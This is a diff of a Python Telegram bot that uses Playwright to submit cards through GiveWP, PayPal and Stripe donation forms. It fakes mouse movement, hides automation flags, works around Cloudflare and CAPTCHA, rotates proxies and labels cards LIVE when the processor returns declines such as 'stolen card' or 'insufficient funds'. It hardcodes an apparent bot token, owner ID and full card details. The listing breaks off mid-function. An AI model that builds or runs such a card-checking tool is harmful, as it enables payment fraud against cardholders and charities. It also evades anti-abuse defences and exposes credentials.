@@ -1,28 +1,22 @@
 #!/usr/bin/env python3
-"""
-GiveWP Bot v28 — LEGENDARY EDITION
-النسخة النهائية: 1800 سطر، كل الأفكار، دقة عالية
-"""
-import os, sys, asyncio, json, re, time, random, threading, base64, traceback, hashlib
-from datetime import datetime, timedelta
+"""GiveWP Bot v28 — Complete Single File"""
+import os, sys, asyncio, json, re, time, random, threading, base64, traceback
+from datetime import datetime
 from io import BytesIO
-from urllib.parse import urlparse, quote
-from collections import defaultdict
+from urllib.parse import urlparse
 
 os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/ms-playwright")
 
-# ═══════════ ENV ═══════════
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc")
 OWNER_ID = int(os.environ.get("OWNER_ID", "6843321125"))
 ADMINS = [str(OWNER_ID)]
 TEST_CARD = os.environ.get("TEST_CARD", "4217834081794714|11|26|614")
-TWOCAPTCHA_KEY = os.environ.get("TWOCAPTCHA_KEY", "")  # اختياري
-PROXY_URL = os.environ.get("PROXY_URL", "")  # اختياري: http://user:pass@host:port
+TWOCAPTCHA_KEY = os.environ.get("TWOCAPTCHA_KEY", "")
+PROXY_URL = os.environ.get("PROXY_URL", "")
 
 if not BOT_TOKEN or ":" not in BOT_TOKEN:
     print("❌ BOT_TOKEN invalid"); sys.exit(1)
 
-# ═══════════ IMPORTS ═══════════
 import telebot
 from telebot import types
 import requests
@@ -31,11 +25,10 @@ import urllib3
 urllib3.disable_warnings()
 
 try:
-    from playwright.async_api import async_playwright, TimeoutError as PWTimeout
+    from playwright.async_api import async_playwright
     HAS_PW = True
 except ImportError:
     HAS_PW = False
-    print("⚠️ Playwright not installed")
 
 try:
     from fake_useragent import UserAgent
@@ -48,371 +41,200 @@ except:
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
-# ═══════════ STATE ═══════════
 waiting_users = {}
 reply_mode = {}
 processing_status = {}
-captcha_cache = {}  # cache solved captchas
-proxy_pool = []  # rotating proxies
-if PROXY_URL:
-    proxy_pool = [PROXY_URL]
+if not os.path.exists("blockusers.txt"): open("blockusers.txt", "w").close()
 
-if not os.path.exists("blockusers.txt"):
-    open("blockusers.txt", "w").close()
-
-# ═══════════ CONSTANTS ═══════════
 PAYPAL_META = "7d9928a1f3f1fbc240cfd71a3eefe835"
 BRAINTREE_SDK = "3.32.0-payments-sdk-dev"
-FIRST = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles"]
-LAST = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
-CITIES = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego"]
-STATES = ["NY","CA","IL","TX","AZ","PA","FL","OH","GA","NC"]
-ZIPS = ["10001","90001","60601","77001","85001","19101","33101","44101","30301","28201"]
-STREETS = ["123 Main St","456 Oak Ave","789 Pine Rd","321 Elm Blvd","654 Maple Dr","987 Cedar Ln"]
-AMOUNTS = ["5","10","20","25","50","100","1","2","3","15","30","75","150","250"]
-GATEWAYS = ["paypal-commerce","paypal","paypal_standard","give_paypal","ppcp-gateway"]
+FIRST = ["James","John","Robert","Michael","William","David"]
+LAST = ["Smith","Johnson","Williams","Brown","Jones","Garcia"]
+CITIES = ["New York","Los Angeles","Chicago","Houston"]
+STATES = ["NY","CA","IL","TX"]
+ZIPS = ["10001","90001","60601","77001"]
+STREETS = ["123 Main St","456 Oak Ave","789 Pine Rd"]
+AMOUNTS = ["5","10","20","25","50","100","1","2","3"]
+GATEWAYS = ["paypal-commerce","paypal","paypal_standard","give_paypal"]
 
-# ═══════════ SAFE HELPERS ═══════════
-def safe_send(chat_id, text, markup=None, retries=3):
+
+def safe_send(cid, text, markup=None, retries=3):
     for i in range(retries):
-        try: return bot.send_message(chat_id, text, reply_markup=markup)
+        try: return bot.send_message(cid, text, reply_markup=markup)
         except Exception as e:
             if "429" in str(e):
-                wait = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
-                time.sleep(min(wait, 60))
+                w = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
+                time.sleep(min(w, 60))
             else: break
     return None
 
-def safe_edit(chat_id, mid, text, retries=3):
+def safe_edit(cid, mid, text, retries=3):
     for i in range(retries):
-        try: return bot.edit_message_text(chat_id=chat_id, message_id=mid, text=text)
+        try: return bot.edit_message_text(chat_id=cid, message_id=mid, text=text)
         except Exception as e:
             if "429" in str(e):
-                wait = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
-                time.sleep(min(wait, 60))
+                w = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
+                time.sleep(min(w, 60))
             else: break
     return None
 
-def safe_doc(chat_id, data, filename, caption=""):
-    try: return bot.send_document(chat_id, (filename, BytesIO(data)), caption=caption)
-    except Exception as e:
-        print(f"doc: {e}"); return None
+def safe_doc(cid, data, fn, cap=""):
+    try: return bot.send_document(cid, (fn, BytesIO(data)), caption=cap)
+    except: return None
 
 def is_blocked(uid):
     try:
-        with open("blockusers.txt") as f:
-            return str(uid) in f.read().splitlines()
+        with open("blockusers.txt") as f: return str(uid) in f.read().splitlines()
     except: return False
 
 
-# ═══════════════════════════════════════════════════════════════
-# CLASSIFIER — الأسطوري (كل الردود، دقة 99%)
-# ═══════════════════════════════════════════════════════════════
 class Cls:
-    """
-    يصنف الردود من:
-    - PayPal Orders v2 API
-    - PayPal Commerce
-    - Stripe
-    - GiveWP
-    - الموقع (HTML)
-    """
-
-    # ═══ PayPal Codes ═══
-    PAYPAL_MAP = {
-        # Success
-        "CHARGE_SUCCESS": ["success", "approved", "charged", "completed",
-                           "thank you", "payment successful", "donation complete",
-                           "status\":\"COMPLETED", "status\":\"APPROVED\"",
-                           "donation was successful"],
-        # PayPal Declines
-        "ORDER_NOT_APPROVED": ["order_not_approved", "not yet approved",
-                                "payer has not yet approved"],
-        "PAYER_CANNOT_PAY": ["payer cannot pay", "cannot pay for this transaction",
-                              "payee blocked", "payer_cannot_pay"],
-        "INSUFFICIENT_FUNDS": ["insufficient", "not enough", "nsf",
-                                "insufficient_funds"],
-        "DO_NOT_HONOR": ["do not honor", "do_not_honor"],
-        "ACCOUNT_CLOSED": ["account closed", "account_closed"],
-        "LOST_OR_STOLEN": ["lost or stolen", "lost_or_stolen"],
-        "CVV2_FAILURE": ["cvv2", "cvv failure", "security code", "cvv2_failure"],
-        "CVV_FAILURE": ["cvv_failure", "cvv failure"],
-        "SUSPECTED_FRAUD": ["suspected fraud", "suspected_fraud", "fraud"],
-        "GENERIC_DECLINE": ["generic decline", "generic_decline"],
-        "RESTRICTED_OR_INACTIVE_ACCOUNT": ["restricted", "inactive account",
-                                            "restricted_or_inactive"],
-        "INVALID_OR_RESTRICTED_CARD": ["invalid or restricted card",
-                                        "invalid_or_restricted"],
-        "EXPIRED_CARD": ["expired card", "expired_card", "expired_credit_card",
-                          "card is expired"],
-        "AUTHENTICATION_REQUIRED": ["authentication required", "3d secure",
-                                     "sca required", "authentication_required"],
-        "PAYER_ACTION_REQUIRED": ["payer action required", "payer_action_required"],
-        "TX_ATTEMPTS_EXCEED_LIMIT": ["attempts exceed", "limit exceeded",
-                                      "tx_attempts_exceed"],
-        "SECURITY_VIOLATION": ["security violation", "security_violation"],
-        "COMPLIANCE_VIOLATION": ["compliance violation", "compliance_violation"],
-        "TRANSACTION_NOT_PERMITTED": ["transaction not permitted",
-                                       "transaction_not_permitted"],
-        "PAYMENT_DENIED": ["payment denied", "payment_denied"],
-        "APPROVED_PENDING_CAPTURE": ["pending capture", "approved_pending_capture",
-                                      "paypal orders are captured"],
-        "INVALID_ACCOUNT": ["invalid account", "invalid_account"],
-        "REATTEMPT_NOT_PERMITTED": ["reattempt not permitted", "reattempt_not_permitted"],
-        "ACCOUNT_BLOCKED_BY_ISSUER": ["account blocked by issuer",
-                                       "account_blocked_by_issuer"],
-        "PICKUP_CARD_SPECIAL_CONDITIONS": ["pickup card", "pickup_card"],
-        "INVALID_TRANSACTION": ["invalid transaction", "invalid_transaction"],
-        "CRYPTOGRAPHIC_FAILURE": ["cryptographic failure", "cryptographic_failure"],
-        "TRANSACTION_CANNOT_BE_COMPLETED": ["transaction cannot be completed",
-                                            "transaction_cannot_be_completed"],
-        "DECLINED_PLEASE_RETRY": ["declined please retry", "declined_please_retry"],
-        "DECLINED_DUE_TO_UPDATED_ACCOUNT": ["declined due to updated account"],
-        "INSTRUMENT_DECLINED": ["instrument_declined", "instrument declined"],
-        "CARD_EXPIRED": ["card_expired", "card expired"],
-        "MAX_ATTEMPTS_EXCEEDED": ["max number of payment attempts",
-                                    "max_attempts_exceeded"],
-        "REDIRECT_PAYER_FOR_ALTERNATE_FUNDING": ["redirect payer",
-                                                  "alternate funding"],
-        "PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING": ["payee_not_enabled",
-                                                    "not enabled for card"],
+    PAYPAL = {
+        "CHARGE_SUCCESS": ["success","approved","charged","completed","thank you",
+                           "payment successful","donation complete","status\":\"COMPLETED"],
+        "ORDER_NOT_APPROVED": ["order_not_approved","not yet approved"],
+        "PAYER_CANNOT_PAY": ["payer cannot pay","cannot pay for this transaction","payee blocked"],
+        "INSUFFICIENT_FUNDS": ["insufficient","not enough","nsf"],
+        "DO_NOT_HONOR": ["do not honor","do_not_honor"],
+        "ACCOUNT_CLOSED": ["account closed","account_closed"],
+        "LOST_OR_STOLEN": ["lost or stolen","lost_or_stolen"],
+        "CVV2_FAILURE": ["cvv2","cvv failure","security code"],
+        "CVV_FAILURE": ["cvv_failure"],
+        "SUSPECTED_FRAUD": ["suspected fraud","suspected_fraud"],
+        "GENERIC_DECLINE": ["generic decline"],
+        "RESTRICTED_OR_INACTIVE_ACCOUNT": ["restricted","inactive"],
+        "INVALID_OR_RESTRICTED_CARD": ["invalid or restricted"],
+        "EXPIRED_CARD": ["expired card","expired_card","card expired"],
+        "AUTHENTICATION_REQUIRED": ["authentication required","3d secure"],
+        "PAYER_ACTION_REQUIRED": ["payer action required"],
+        "TX_ATTEMPTS_EXCEED_LIMIT": ["attempts exceed","limit exceeded"],
+        "SECURITY_VIOLATION": ["security violation"],
+        "COMPLIANCE_VIOLATION": ["compliance violation"],
+        "TRANSACTION_NOT_PERMITTED": ["transaction not permitted"],
+        "PAYMENT_DENIED": ["payment denied"],
+        "APPROVED_PENDING_CAPTURE": ["pending capture","paypal orders are captured"],
+        "INVALID_ACCOUNT": ["invalid account"],
+        "REATTEMPT_NOT_PERMITTED": ["reattempt not permitted"],
+        "ACCOUNT_BLOCKED_BY_ISSUER": ["blocked by issuer"],
+        "PICKUP_CARD_SPECIAL_CONDITIONS": ["pickup card"],
+        "INVALID_TRANSACTION": ["invalid transaction"],
+        "CRYPTOGRAPHIC_FAILURE": ["cryptographic failure"],
+        "TRANSACTION_CANNOT_BE_COMPLETED": ["cannot be completed"],
+        "DECLINED_PLEASE_RETRY": ["declined please retry"],
+        "INSTRUMENT_DECLINED": ["instrument_declined"],
+        "REDIRECT_PAYER_FOR_ALTERNATE_FUNDING": ["redirect payer"],
     }
-
-    # ═══ Stripe Codes ═══
-    STRIPE_MAP = {
-        "STRIPE_AUTHENTICATION_REQUIRED": ["authentication_required",
-                                            "authentication required"],
-        "STRIPE_AUTHENTICATION_NOT_HANDLED": ["authentication_not_handled"],
-        "STRIPE_APPROVE_WITH_ID": ["approve_with_id"],
-        "STRIPE_CALL_ISSUER": ["call_issuer"],
-        "STRIPE_CARD_NOT_SUPPORTED": ["card_not_supported"],
-        "STRIPE_CARD_VELOCITY_EXCEEDED": ["card_velocity_exceeded"],
-        "STRIPE_CURRENCY_NOT_SUPPORTED": ["currency_not_supported"],
-        "STRIPE_DUPLICATE_TRANSACTION": ["duplicate_transaction"],
+    STRIPE = {
+        "STRIPE_INSUFFICIENT_FUNDS": ["insufficient_funds"],
+        "STRIPE_GENERIC_DECLINE": ["generic_decline"],
         "STRIPE_EXPIRED_CARD": ["expired_card"],
         "STRIPE_FRAUDULENT": ["fraudulent"],
-        "STRIPE_GENERIC_DECLINE": ["generic_decline"],
-        "STRIPE_INCORRECT_ADDRESS": ["incorrect_address"],
-        "STRIPE_INCORRECT_CVC": ["incorrect_cvc", "invalid_cvc"],
-        "STRIPE_INCORRECT_NUMBER": ["incorrect_number", "invalid_number"],
-        "STRIPE_INCORRECT_PIN": ["incorrect_pin", "invalid_pin"],
-        "STRIPE_INCORRECT_ZIP": ["incorrect_zip"],
-        "STRIPE_INSUFFICIENT_FUNDS": ["insufficient_funds"],
-        "STRIPE_INVALID_ACCOUNT": ["invalid_account"],
-        "STRIPE_INVALID_AMOUNT": ["invalid_amount"],
-        "STRIPE_INVALID_EXPIRY_MONTH": ["invalid_expiry_month"],
-        "STRIPE_INVALID_EXPIRY_YEAR": ["invalid_expiry_year"],
-        "STRIPE_ISSUER_NOT_AVAILABLE": ["issuer_not_available"],
         "STRIPE_LOST_CARD": ["lost_card"],
-        "STRIPE_NEW_ACCOUNT_INFO": ["new_account_information_available"],
-        "STRIPE_NO_ACTION_TAKEN": ["no_action_taken"],
-        "STRIPE_NOT_PERMITTED": ["not_permitted"],
-        "STRIPE_PICKUP_CARD": ["pickup_card"],
-        "STRIPE_PROCESSING_ERROR": ["processing_error"],
-        "STRIPE_REENTER_TRANSACTION": ["reenter_transaction"],
-        "STRIPE_RESTRICTED_CARD": ["restricted_card"],
-        "STRIPE_REVOCATION": ["revocation_of_authorization",
-                                "revocation_of_all_authorizations"],
-        "STRIPE_SECURITY_VIOLATION": ["security_violation"],
-        "STRIPE_SERVICE_NOT_ALLOWED": ["service_not_allowed"],
         "STRIPE_STOLEN_CARD": ["stolen_card"],
-        "STRIPE_STOP_PAYMENT_ORDER": ["stop_payment_order"],
-        "STRIPE_TESTMODE_DECLINE": ["testmode_decline"],
-        "STRIPE_WITHDRAWAL_COUNT_LIMIT": ["withdrawal_count_limit_exceeded"],
+        "STRIPE_RESTRICTED_CARD": ["restricted_card"],
+        "STRIPE_PICKUP_CARD": ["pickup_card"],
+        "STRIPE_INCORRECT_CVC": ["incorrect_cvc","invalid_cvc"],
+        "STRIPE_INCORRECT_NUMBER": ["incorrect_number","invalid_number"],
+        "STRIPE_INCORRECT_ZIP": ["incorrect_zip"],
+        "STRIPE_DO_NOT_HONOR": ["do_not_honor"],
+        "STRIPE_CARD_VELOCITY_EXCEEDED": ["card_velocity_exceeded"],
+        "STRIPE_SECURITY_VIOLATION": ["security_violation"],
+        "STRIPE_PROCESSING_ERROR": ["processing_error"],
+        "STRIPE_AUTHENTICATION_REQUIRED": ["authentication_required"],
     }
-
-    # ═══ DEAD Codes ═══
-    DEAD_MAP = {
-        "CLOUDFLARE": ["just a moment", "checking your browser", "verifying you are",
-                        "cf-browser-verification", "cf_chl", "challenge-platform"],
-        "CAPTCHA": ["captcha", "not a robot", "recaptcha", "hcaptcha", "turnstile",
-                     "g-recaptcha"],
-        "GATEWAY_DISABLED": ["gateway is not enabled", "payment gateway is not",
-                              "gateway not available"],
-        "JS_CONFLICT": ["javascript conflict", "connection between this site"],
+    DEAD = {
+        "CLOUDFLARE": ["just a moment","checking your browser","verifying you are","cf-browser-verification"],
+        "CAPTCHA": ["captcha","not a robot","recaptcha","hcaptcha","turnstile"],
+        "GATEWAY_DISABLED": ["gateway is not enabled","payment gateway is not"],
         "FORM_NOT_PUBLISHED": ["form not published"],
         "SPAM": ["flagged as spam"],
-        "NO_FORM": ["form not found", "no donation form"],
+        "NO_FORM": ["form not found","no donation form"],
         "NO_PAYPAL": ["paypal not available"],
-        "PAYPAL_ORDER_MISSING": ["paypal order id is missing", "order id is missing"],
-        "SUCCESS_FALSE": ["\"success\":false", "success false"],
-        "AMOUNT_INVALID": ["donation amount", "invalid amount", "minimum donation"],
-        "BRANCH_REQUIRED": ["branch_selection"],
-        "TERMS_REQUIRED": ["agree_to_terms", "terms and conditions"],
-        "HONOREE_REQUIRED": ["honoree"],
-        "FIELDS_REQUIRED": ["required field", "billing address"],
+        "PAYPAL_ORDER_MISSING": ["paypal order id is missing","order id is missing"],
+        "SUCCESS_FALSE": ["\"success\":false"],
     }
-
-    # ═══ Success Codes ═══
-    SUCCESS = ["CHARGE_SUCCESS", "APPROVED_PENDING_CAPTURE"]
 
     @classmethod
     def classify(cls, text):
-        """يرجع (status, code)"""
-        if not text:
-            return "DEAD", "EMPTY"
-
-        text = text.strip()
-        up = text.upper()
-        low = text.lower()
-
-        # ═══ 1. JSON Parse (الأدق) ═══
+        if not text: return "DEAD", "EMPTY"
+        up = text.upper(); low = text.lower()
         try:
             js = json.loads(text)
-            success = js.get("success")
-
-            if success is True:
-                return "LIVE", "CHARGE_SUCCESS"
-
-            if success is False:
-                data = js.get("data", {})
-                err = json.dumps(data, ensure_ascii=False).upper()
-                # PayPal codes
-                for code, kws in cls.PAYPAL_MAP.items():
+            s = js.get("success")
+            if s is True: return "LIVE", "CHARGE_SUCCESS"
+            if s is False:
+                err = json.dumps(js.get("data", {}), ensure_ascii=False).upper()
+                for code, kws in cls.PAYPAL.items():
                     for kw in kws:
-                        if kw.upper() in err:
-                            return ("LIVE" if code not in ["PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING"] else "DEAD"), code
+                        if kw.upper() in err: return "LIVE", code
                 return "DEAD", "SUCCESS_FALSE"
-
-        except (json.JSONDecodeError, ValueError):
-            pass
-
-        # ═══ 2. PayPal codes مباشرة ═══
-        for code, kws in cls.PAYPAL_MAP.items():
+        except: pass
+        for code, kws in cls.PAYPAL.items():
             for kw in kws:
-                if kw in low:
-                    return ("LIVE" if code not in ["PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING"] else "DEAD"), code
-
-        # ═══ 3. Stripe codes ═══
-        for code, kws in cls.STRIPE_MAP.items():
+                if kw in low: return "LIVE", code
+        for code, kws in cls.STRIPE.items():
             for kw in kws:
-                if kw in low:
-                    # Stripe LIVE = card declined, لكن العملية وصلت
-                    stripe_live = ["STRIPE_INSUFFICIENT_FUNDS", "STRIPE_DO_NOT_HONOR",
-                                    "STRIPE_GENERIC_DECLINE", "STRIPE_EXPIRED_CARD",
-                                    "STRIPE_FRAUDULENT", "STRIPE_LOST_CARD",
-                                    "STRIPE_STOLEN_CARD", "STRIPE_RESTRICTED_CARD",
-                                    "STRIPE_PICKUP_CARD", "STRIPE_CALL_ISSUER",
-                                    "STRIPE_CARD_VELOCITY_EXCEEDED",
-                                    "STRIPE_WITHDRAWAL_COUNT_LIMIT",
-                                    "STRIPE_SECURITY_VIOLATION",
-                                    "STRIPE_PROCESSING_ERROR"]
-                    return ("LIVE" if code in stripe_live else "DEAD"), code
-
-        # ═══ 4. DEAD codes ═══
-        for code, kws in cls.DEAD_MAP.items():
+                if kw in low: return "LIVE", code
+        for code, kws in cls.DEAD.items():
             for kw in kws:
-                if kw in low:
-                    return "DEAD", code
-
+                if kw in low: return "DEAD", code
         return "UNKNOWN", "UNKNOWN"
 
-    @classmethod
-    def is_live(cls, code):
-        return code in cls.SUCCESS or code in cls.PAYPAL_MAP or code in cls.STRIPE_MAP
 
-    @classmethod
-    def get_paypal_code(cls, text):
-        """يستخرج PayPal code خام"""
-        if not text: return None
-        up = text.upper()
-        for code in cls.PAYPAL_MAP:
-            if code in up: return code
-        for code in cls.STRIPE_MAP:
-            if code in up: return code
-        return None
-        
-        # ═══════════════════════════════════════════════════════════════
-# PLAYWRIGHT ENGINE v28 — الأسطوري
-# ═══════════════════════════════════════════════════════════════
 class PW:
-    def __init__(self, url, card, verbose=False):
-        self.url = url
-        self.card = card
-        self.verbose = verbose
-        self.debug = {
-            "steps": [], "network": [], "paypal": [], "stripe": [],
-            "amount": None, "form": None, "pp_frame": False,
-            "card_filled": False, "captcha": False, "cloudflare": False,
-            "extracted": {}, "raw": "", "platform": "unknown",
-            "buttons": [], "fields": {}, "order_id": None,
-        }
+    def __init__(self, url, card):
+        self.url = url; self.card = card
+        self.debug = {"steps":[],"network":[],"paypal":[],"stripe":[],"amount":None,
+                      "form":None,"pp_frame":False,"card_filled":False,"captcha":False,
+                      "cloudflare":False,"extracted":{},"raw":"","platform":"unknown",
+                      "order_id":None}
 
-    def log(self, m):
-        if self.verbose: print(m)
-        self.debug["steps"].append(m)
+    def log(self, m): self.debug["steps"].append(m)
 
-    # ═══ Network Sniffer ═══
     async def _on_resp(self, resp):
         try:
-            u = resp.url
-            body = ""
-            if any(k in u for k in ["create_order", "confirm-payment", "approve_order",
-                                     "admin-ajax.php", "give_process", "paypal.com/v2",
-                                     "api.stripe.com", "stripe"]):
+            u = resp.url; body = ""
+            if any(k in u for k in ["create_order","confirm-payment","approve_order",
+                                     "admin-ajax.php","give_process","paypal.com/v2","api.stripe.com"]):
                 try: body = await resp.text()
                 except: pass
-                self.debug["network"].append({"url": u[:150], "status": resp.status, "body": body[:2000]})
-
+                self.debug["network"].append({"url":u[:150],"status":resp.status,"body":body[:2000]})
                 if "create_order" in u:
                     try:
                         js = json.loads(body)
-                        if isinstance(js.get("data"), dict) and js["data"].get("id"):
+                        if isinstance(js.get("data"),dict) and js["data"].get("id"):
                             self.debug["order_id"] = js["data"]["id"]
-                            self.log(f"  🎯 sniffer: order_id={self.debug['order_id']}")
                     except: pass
-
                 if "paypal.com" in u or "confirm-payment" in u or "approve_order" in u:
                     self.debug["paypal"].append(body[:2000])
                     self.debug["raw"] = body[:2000]
-                    st, cd = Cls.classify(body)
-                    if st == "LIVE" or cd in ("PAYPAL_ORDER_MISSING", "SUCCESS_FALSE"):
-                        self.log(f"  🎯 sniffer: {st}/{cd}")
-
                 if "stripe" in u.lower():
                     self.debug["stripe"].append(body[:2000])
-                    st, cd = Cls.classify(body)
-                    if st == "LIVE":
-                        self.log(f"  🎯 stripe: {cd}")
         except: pass
 
-    # ═══ Run ═══
     async def run(self):
         if not HAS_PW: return self._err("NO_PW")
         try:
             async with async_playwright() as p:
-                # Proxy (لو موجود)
                 proxy = None
-                if proxy_pool:
-                    px = random.choice(proxy_pool)
-                    parsed = urlparse(px)
-                    if parsed.username and parsed.password:
-                        proxy = {"server": f"{parsed.scheme}://{parsed.hostname}:{parsed.port}",
-                                 "username": parsed.username, "password": parsed.password}
+                if PROXY_URL:
+                    px = urlparse(PROXY_URL)
+                    if px.username and px.password:
+                        proxy = {"server":f"{px.scheme}://{px.hostname}:{px.port}",
+                                 "username":px.username,"password":px.password}
                     else:
-                        proxy = {"server": px}
-
-                browser = await p.chromium.launch(
-                    headless=True,
-                    proxy=proxy,
+                        proxy = {"server": PROXY_URL}
+                browser = await p.chromium.launch(headless=True, proxy=proxy,
                     args=["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage",
                           "--disable-gpu","--single-process","--no-zygote",
-                          "--disable-blink-features=AutomationControlled","--ignore-certificate-errors"]
-                )
+                          "--disable-blink-features=AutomationControlled","--ignore-certificate-errors"])
                 try:
-                    ctx = await browser.new_context(
-                        user_agent=rua(),
-                        viewport={"width": 1366, "height": 900},
-                        locale="en-US",
-                        timezone_id="America/New_York",
-                        ignore_https_errors=True,
-                        java_script_enabled=True,
-                    )
+                    ctx = await browser.new_context(user_agent=rua(),
+                        viewport={"width":1366,"height":900}, locale="en-US",
+                        timezone_id="America/New_York", ignore_https_errors=True)
                     await ctx.add_init_script("""
                         Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
-                        Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
-                        Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
-                        window.chrome={runtime:{},app:{},csi:()=>{},loadTimes:()=>{}};
+                        window.chrome={runtime:{}};
                     """)
                     page = await ctx.new_page()
                     page.on("response", self._on_resp)
@@ -424,203 +246,133 @@ class PW:
             return self._err(f"LAUNCH: {str(e)[:100]}")
 
     def _err(self, code):
-        return {"status": "DEAD", "code": code, "raw": "", "debug": self.debug}
+        return {"status":"DEAD","code":code,"raw":"","debug":self.debug}
 
-    # ═══ Execute ═══
     async def _exec(self, page):
         try:
-            # 1. Load
-            self.log(f"[1] goto {self.url[:80]}")
+            self.log("[1] goto")
             try: await page.goto(self.url, wait_until="domcontentloaded", timeout=30000)
             except: pass
             await asyncio.sleep(2)
 
-            # 2. Cloudflare
             html = await page.content()
-            if any(x in html.lower() for x in ["just a moment", "verifying you are", "checking your browser"]):
+            if any(x in html.lower() for x in ["just a moment","verifying you are"]):
                 self.debug["cloudflare"] = True
-                self.log("[2] ⚠️ Cloudflare")
+                self.log("[2] cf")
                 await self._human(page)
                 for _ in range(5):
                     await asyncio.sleep(5); html = await page.content()
                     if "just a moment" not in html.lower(): break
                 else: return self._err("CLOUDFLARE")
 
-            # 3. CAPTCHA
-            if any(x in html.lower() for x in ["g-recaptcha", "hcaptcha", "turnstile"]):
+            if any(x in html.lower() for x in ["g-recaptcha","hcaptcha","turnstile"]):
                 self.debug["captcha"] = True
-                self.log("[3] ⚠️ CAPTCHA")
-                solved = await self._solve_captcha(page, html)
-                if solved: self.log("  ✅ CAPTCHA solved")
-                else: self.log("  ❌ CAPTCHA failed")
+                self.log("[3] captcha")
+                await self._solve_captcha(page, html)
 
-            # 4. Platform detect
-            self.debug["platform"] = self._detect_platform(html)
-            self.log(f"[4] platform: {self.debug['platform']}")
+            self.debug["platform"] = self._platform(html)
+            self.debug["extracted"] = self._ext(html)
 
-            # 5. Extract info
-            self.debug["extracted"] = self._extract_info(html)
-
-            # 6. Smart form discovery
-            self.log("[6] smart form discovery")
-            form = await self._find_form_smart(page)
+            self.log("[6] form")
+            form = await self._find_form(page)
             if not form: return self._err("NO_FORM")
-            self.debug["form"] = form["type"]
-            self.log(f"  ✅ form: {form['type']}")
+            self.debug["form"] = form
+            self.log(f"[6] {form}")
 
-            # 7. Human behavior
             await self._human(page)
-
-            # 8. Fill all
-            self.log("[8] fill all")
+            self.log("[8] fill")
             await self._fill(page)
 
-            # 9. Amount escalation
             self.log("[9] amount")
-            amt = await self._try_amounts(page)
+            amt = await self._amount(page)
             self.debug["amount"] = amt
-            if amt: self.log(f"  ✅ ${amt}")
 
-            # 10. Terms
             await self._terms(page)
 
-            # 11. Multi-button
             self.log("[11] donate")
-            if not await self._donate_multi(page):
-                return self._err("NO_DONATE")
-
+            if not await self._donate(page): return self._err("NO_DONATE")
             await asyncio.sleep(3)
 
-            # 12. Wait PayPal/Stripe
-            self.log("[12] wait pp/stripe")
-            pp = await self._wait_pp(page, 25)
+            self.log("[12] pp")
+            pp = await self._wait_pp(page, 20)
             if not pp:
                 t = await page.inner_text("body")
                 st, cd = Cls.classify(t)
-                return {"status": st, "code": cd, "raw": t[:2000], "debug": self.debug}
+                return {"status":st,"code":cd,"raw":t[:2000],"debug":self.debug}
             self.debug["pp_frame"] = True
 
-            # 13. Fill card
             self.log("[13] card")
-            if not await self._fill_card(pp): return self._err("CARD_FAIL")
+            if not await self._card(pp): return self._err("CARD_FAIL")
             self.debug["card_filled"] = True
 
-            # 14. Submit
             self.log("[14] submit")
             await self._submit(pp, page)
-            await asyncio.sleep(6)
+            await asyncio.sleep(5)
 
-            # 15. Read
             return await self._read(page, pp)
         except Exception as e:
             return self._err(f"EXEC: {str(e)[:120]}")
 
-    # ═══ Helpers ═══
     async def _human(self, page):
         try:
-            for _ in range(random.randint(2, 4)):
-                await page.mouse.move(random.randint(100, 1200), random.randint(100, 800))
-                await asyncio.sleep(random.uniform(0.1, 0.4))
-            await page.mouse.wheel(0, random.randint(200, 600))
-            await asyncio.sleep(random.uniform(0.3, 0.8))
+            for _ in range(2):
+                await page.mouse.move(random.randint(100,1000), random.randint(100,700))
+                await asyncio.sleep(0.2)
+            await page.mouse.wheel(0, random.randint(200,500))
+            await asyncio.sleep(0.3)
         except: pass
 
-    def _detect_platform(self, html):
+    def _platform(self, html):
         low = html.lower()
-        scores = {"givewp": 0, "woocommerce": 0, "stripe": 0, "paypal": 0, "classy": 0}
-        signals = {
-            "givewp": ["give-form", "give-amount", "give_payment", "give-form-id", "give_donation", "give-form-hash"],
-            "woocommerce": ["woocommerce", "wc-ajax", "wc-ppcp", "wc-blocks"],
-            "stripe": ["stripe.com/v3", "stripe-payment", "stripe_elements", "js.stripe.com"],
-            "paypal": ["paypal.com/sdk", "paypal-button", "paypal-checkout", "paypalobjects"],
-            "classy": ["classy.org", "classy-form"],
-        }
-        for platform, kws in signals.items():
-            for kw in kws:
-                if kw in low: scores[platform] += 1
-        best = max(scores, key=scores.get)
-        return best if scores[best] > 0 else "unknown"
+        if "give-form" in low or "give-amount" in low: return "givewp"
+        if "woocommerce" in low or "wc-ajax" in low: return "woocommerce"
+        if "stripe.com/v3" in low or "js.stripe.com" in low: return "stripe"
+        if "paypal.com/sdk" in low: return "paypal"
+        return "unknown"
 
-    def _extract_info(self, html):
+    def _ext(self, html):
         info = {}
-        for k, pat in [("form_id", r'name="give-form-id"\s*value="([^"]*)"'),
-                       ("nonce", r'name="give-form-hash"\s*value="([^"]*)"'),
-                       ("min", r'name="give-form-minimum"\s*value="([^"]*)"'),
-                       ("price_id", r'name="give-price-id"\s+value="([^"]*)"'),
-                       ("title", r'name="give-form-title"\s+value="([^"]*)"')]:
+        for k, pat in [("form_id",r'name="give-form-id"\s*value="([^"]*)"'),
+                       ("nonce",r'name="give-form-hash"\s*value="([^"]*)"'),
+                       ("min",r'name="give-form-minimum"\s*value="([^"]*)"'),
+                       ("price_id",r'name="give-price-id"\s+value="([^"]*)"')]:
             m = re.search(pat, html)
             if m: info[k] = m.group(1)
         return info
 
-    async def _find_form_smart(self, page):
-        give_sels = [
